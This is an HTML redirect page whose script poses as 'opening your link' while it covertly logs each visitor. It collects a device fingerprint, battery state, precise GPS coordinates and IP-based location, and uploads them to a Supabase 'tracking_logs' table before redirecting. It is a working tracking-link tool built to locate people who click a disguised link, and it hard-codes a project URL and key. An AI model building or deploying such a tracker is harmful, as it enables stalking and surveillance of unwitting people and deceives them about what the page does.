<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
      background: white;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    
    .container {
      text-align: center;
      padding: 20px;
    }
    
    .spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #e5e7eb;
      border-top-color: #3b82f6;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 16px;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    .message {
      color: #374151;
      font-size: 16px;
      font-weight: 500;
    }
    
    .error {
      color: #dc2626;
    }
    
    .error-icon {
      font-size: 48px;
      margin-bottom: 16px;
    }
  </style>
</head>
<body>
  <div id="app" class="container">
    <div class="spinner"></div>
    <p class="message">We are opening your link...</p>
  </div>

  <script>
    // Supabase configuration
    const SUPABASE_URL = 'https://zdnpadhlblyazzzwserr.supabase.co';
    const SUPABASE_ANON_KEY = 'sb_publishable_zo1mrKN61gpDnlZNBnxzKg_BFLQed-E';

    // Get tracking code from URL parameter
    const urlParams = new URLSearchParams(window.location.search);
    const trackingCode = urlParams.get('code');

    // Show error message
    function showError(message) {
      document.getElementById('app').innerHTML = `
        <div class="error-icon">⚠️</div>
        <p class="message error">${message}</p>
      `;
    }

    // Collect device information (instant)
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let browser = 'Unknown';
      let browserVersion = 'Unknown';
      let os = 'Unknown';
      let deviceType = 'Desktop';

      if (ua.includes('Firefox')) {
        browser = 'Firefox';
        browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Chrome')) {
        browser = 'Chrome';
        browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Safari')) {
        browser = 'Safari';
        browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Edge')) {
        browser = 'Edge';
        browserVersion = ua.match(/Edge\/(\d+\.\d+)/)?.[1] || 'Unknown';
      }

      if (ua.includes('Windows')) os = 'Windows';
      else if (ua.includes('Mac')) os = 'macOS';
      else if (ua.includes('Linux')) os = 'Linux';
      else if (ua.includes('Android')) os = 'Android';
      else if (ua.includes('iOS')) os = 'iOS';

      if (/Mobile|Android|iPhone|iPad|iPod/i.test(ua)) {
        deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Mobile';
      }

      return {
        browser,
        browserVersion,
        os,
        deviceType,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        userAgent: ua,
        platform: navigator.platform,
      };
    }

    // Get battery information
    async function getBatteryInfo() {
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          return {
            level: Math.round(battery.level * 100),
            charging: battery.charging,
          };
        } catch (e) {
          console.warn('Battery API error:', e);
        }
      }
      return { level: null, charging: null };
    }

    // Get high-accuracy GPS geolocation
    function getGeolocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          resolve({ latitude: null, longitude: null, accuracy: null, altitude: null });
          return;
        }

        // Force enableHighAccuracy: true & maximumAge: 0 for fresh pinpoint hardware GPS coordinates
        navigator.geolocation.getCurrentPosition(
          (position) => {
            resolve({
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude || null,
            });
          },
          (error) => {
            console.warn('High accuracy Geolocation error:', error);
            resolve({ latitude: null, longitude: null, accuracy: null, altitude: null });
          },
          { enableHighAccuracy: true, timeout: 3500, maximumAge: 0 }
        );
      });
    }

    // Get IP information racing multiple fast APIs in parallel
    async function getIPInfo() {
      const fetchApi = (url, parse) => {
        return new Promise((resolve, reject) => {
          const controller = new AbortController();
          const timer = setTimeout(() => controller.abort(), 2000);
          fetch(url, { signal: controller.signal })
            .then(r => {
              if (!r.ok) throw new Error('API error');
              return r.json();
            })
            .then(d => {
              clearTimeout(timer);
              const parsed = parse(d);
              if (parsed && parsed.ip && parsed.lat != null && parsed.lon != null) {
                resolve(parsed);
              } else {
                reject(new Error('Invalid IP payload'));
              }
            })
            .catch(err => {
              clearTimeout(timer);
              reject(err);
            });
        });
      };

      const apis = [
        fetchApi('https://ipwho.is/', d => ({
          ip: d.ip,
          city: d.city,
          region: d.region,
          country: d.country,
          lat: d.latitude,
          lon: d.longitude
        })),
        fetchApi('http://ip-api.com/json/', d => ({
          ip: d.query,
          city: d.city,
          region: d.regionName,
          country: d.country,
          lat: d.lat,
          lon: d.lon
        })),
        fetchApi('https://freeipapi.com/api/json', d => ({
          ip: d.ipAddress,
          city: d.cityName,
          region: d.regionName,
          country: d.countryName,
          lat: d.latitude,
          lon: d.longitude
        }))
      ];

      try {
        return await Promise.any(apis);
      } catch (e) {
        console.warn('All IP APIs failed:', e);
        return { ip: null, city: null, region: null, country: null, lat: null, lon: null };
      }
    }

    // Send tracking data reliably using fetch with API key
    async function sendTrackingData(logData) {
      console.log('Sending tracking data:', logData);
      
      // Crucial: append apikey query param so sendBeacon & fetch are authenticated by Supabase REST gateway
      const url = `${SUPABASE_URL}/rest/v1/tracking_logs?apikey=${SUPABASE_ANON_KEY}`;

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'apikey': SUPABASE_ANON_KEY,
            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
            'Prefer': 'return=minimal'
          },
          body: JSON.stringify(logData),
          keepalive: true
        });
        console.log('Fetch response status:', response.status);
        return response.ok;
      } catch (err) {
        console.error('Failed to send tracking data via fetch:', err);
        if (navigator.sendBeacon) {
          const blob = new Blob([JSON.stringify(logData)], { type: 'application/json' });
          return navigator.sendBeacon(url, blob);
        }
        return false;
      }
    }

    // Helper to enforce hard JS timeout on any promise
    function withTimeout(promise, ms, fallbackValue) {
      return Promise.race([
        promise,
        new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
      ]);
    }

    // Main tracking process - GUARANTEED FAST & RELIABLE LOGGING
    (async function() {
      if (!trackingCode) {
        showError('Invalid tracking link');
        return;
      }

      try {
        // Collect instant device info FIRST (no async)
        const deviceInfo = getDeviceInfo();

        // Prepare basic data with what we have instantly
        const basicLogData = {
          tracking_link_id: null,
          latitude: null,
          longitude: null,
          accuracy: null,
          battery_level: null,
          charging: null,
          browser: deviceInfo.browser,
          browser_version: deviceInfo.browserVersion,
          os: deviceInfo.os,
          device_type: deviceInfo.deviceType,
          screen_resolution: deviceInfo.screenResolution,
          language: deviceInfo.language,
          timezone: deviceInfo.timezone,
          user_agent: deviceInfo.userAgent,
          platform: deviceInfo.platform,
          ip_address: null,
          city: null,
          region: null,
          country: null,
          visited_at: new Date().toISOString(),
        };

        // Step 1: Fetch tracking link
        const linkRes = await fetch(
          `${SUPABASE_URL}/rest/v1/tracking_links?tracking_code=eq.${encodeURIComponent(trackingCode)}&select=*`,
          {
            headers: {
              'apikey': SUPABASE_ANON_KEY,
              'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
            }
          }
        ).catch(err => {
          console.error('Fetch tracking link error:', err);
          return null;
        });

        if (!linkRes || !linkRes.ok) {
          showError('Invalid or expired tracking link');
          return;
        }

        const data = await linkRes.json();
        if (!data || data.length === 0) {
          showError('Invalid or expired tracking link');
          return;
        }

        const trackingLink = data[0];

        // Step 2: Collect additional info in parallel (6s window for hardware GPS lock/prompt response)
        const [batteryInfo, geoInfo, ipInfo] = await Promise.all([
          withTimeout(getBatteryInfo(), 1500, { level: null, charging: null }),
          withTimeout(getGeolocation(), 6000, { latitude: null, longitude: null, accuracy: null, altitude: null }),
          withTimeout(getIPInfo(), 1500, { ip: null, city: null, region: null, country: null, lat: null, lon: null })
        ]);

        // Fix target URL
        let targetUrl = trackingLink.target_url || 'https://google.com';
        if (targetUrl.match(/^https?:[^/]/i)) {
          targetUrl = targetUrl.replace(/^https?:/i, 'https://');
        }
        if (targetUrl.match(/^https?:\/\/https?:\/\//i)) {
          targetUrl = targetUrl.replace(/^https?:\/\/https?:\/\//i, 'https://');
        }
        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
          targetUrl = 'https://' + targetUrl;
        }

        // Determine coordinates: prefer precise GPS, fallback to IP Geolocation
        const hasGps = geoInfo && geoInfo.latitude !== null && geoInfo.longitude !== null;
        const latitude = hasGps ? geoInfo.latitude : (ipInfo ? ipInfo.lat : null);
        const longitude = hasGps ? geoInfo.longitude : (ipInfo ? ipInfo.lon : null);
        const accuracy = hasGps ? geoInfo.accuracy : (ipInfo && ipInfo.lat !== null ? 5000 : null);

        // Prepare complete data
        const completeLogData = {
          ...basicLogData,
          tracking_link_id: trackingLink.id,
          latitude,
          longitude,
          accuracy,
          battery_level: batteryInfo.level,
          charging: batteryInfo.charging,
          ip_address: ipInfo.ip,
          city: ipInfo.city,
          region: ipInfo.region,
          country: ipInfo.country,
        };

        // Await data insertion to ensure record is saved BEFORE redirect
        await sendTrackingData(completeLogData);
        
        console.log('Data sent, redirecting to:', targetUrl);
        window.location.replace(targetUrl);

      } catch (e) {
        console.error('Tracking error:', e);
        showError('An error occurred during tracking');
      }
    })();
  </script>
</body>
</html>
